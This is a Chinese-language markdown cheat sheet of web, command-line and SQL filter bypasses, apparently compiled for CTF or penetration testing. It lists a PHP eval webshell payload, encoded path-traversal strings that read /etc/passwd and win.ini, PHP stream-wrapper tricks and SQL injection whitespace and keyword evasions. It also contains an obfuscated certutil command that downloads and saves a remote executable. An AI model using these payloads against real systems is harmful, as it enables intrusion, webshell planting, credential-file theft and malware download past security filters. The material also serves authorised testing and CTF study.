# Web bypass

- [Bypass Linux Shell Restrictions](#linux-shell-bypass)
- 空格绕过 `a=system ('cat /flag');`
- 大小写绕过
- %0a 绕过
- unicode 绕过, `t => \u0074`
- ~ 反码绕过
- [PHP_INCLUDE_TO_SHELL_CHAR_DICT](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT)
- splstack 绕过匹配 O 开头的序列化数据； [2023 安洵杯 4 号的罗纳尔多](https://mp.weixin.qq.com/s/azbY19cBgs3MgVdo7i-OhQ)
- \_\_halt_compiler();来结束 php 代码执行流程 同上链接
- [详细|waf 绕过学习](https://mp.weixin.qq.com/s/OeZsKohqe87-ieIuW7L9tA)

[实战绕过某 WAF+拿 shell 组合拳](https://mp.weixin.qq.com/s/Q57dOjq279kqOFtSA1mV8Q)
[webshell 检测算法实践](https://mp.weixin.qq.com/s/M4umpduFCI50zOO-5080cw)

| bypass        | payload                                                |     |
| ------------- | ------------------------------------------------------ | --- |
| <?            | `<script language="php">@eval($\_POST['1']);</script>` |     |
| %2F 代替/     | ?filename=..%2F..%2F..%2F..%2Fetc%2Fpasswd             |     |
| 二次编码(%25) | ?filename=..%252F..%252F..%252F..%252Fetc%2Fpasswd     |
| 加入+         | ?filename=.+./.+./bin/redacted.dll                     |
| %00           | ?filename=.%00./file.php <br>/etc/passwd%00.jpg        |
| \ |  ?filename=..%5c..%5c/windows/win.ini


## bypass filter_var($url, FILTER_VALIDATE_URL)

`?url=http://`

## bypass file_get_contents($text,'r')==="welcome to the zjctf"

`?text=data://test/plain,welcome&file=php://filter/resource=useless.php`

# Cmd bypass

```sh
c""""e""""r""""t""""u""""t""""i""""l.exe -urlcache -split -f http://ip/6666.exe 6666.exe

copy /b 1.jpg+2.jpg 3 /y

```

# Linux shell bypass

[Bypass Linux Shell Restrictions](https://mp.weixin.qq.com/s/8QTax87lorWNnOQR8p1ORQ)

# Sql bypass

- https://github.com/Xyntax/waf-bypass/blob/master/payload/sql.txt
- https://lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/#%E6%96%B9%E6%B3%95%E6%9B%BF%E6%8D%A2%E7%BB%95%E8%BF%87
- [sql 注入 bypass waf 工具（1 月 18 日更新）](https://mp.weixin.qq.com/s/qritLmRwP-Q5OLskxNWSVw)
- [Sql 注入过安全狗](https://mp.weixin.qq.com/s/Ighou2aYORZ7rGvJfpeeHg)

| bypass |             |                                                                                                                                            |
| ------ | ----------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
| 大小写 |             |                                                                                                                                            |
| =      | like/regexp | <> 等价于 !=                                                                                                                               |
| 空格   | /\*\*/ 或 + | php 可用 %09、%0A、 %0B、 %0C、 %0D、%A0、%20 <br>and/or 后面可以跟上偶数个!、~可以替代空格 <br>and/or 前的空格可用省略. <br>'后空格可省略 |
|        |             |                                                                                                                                            |
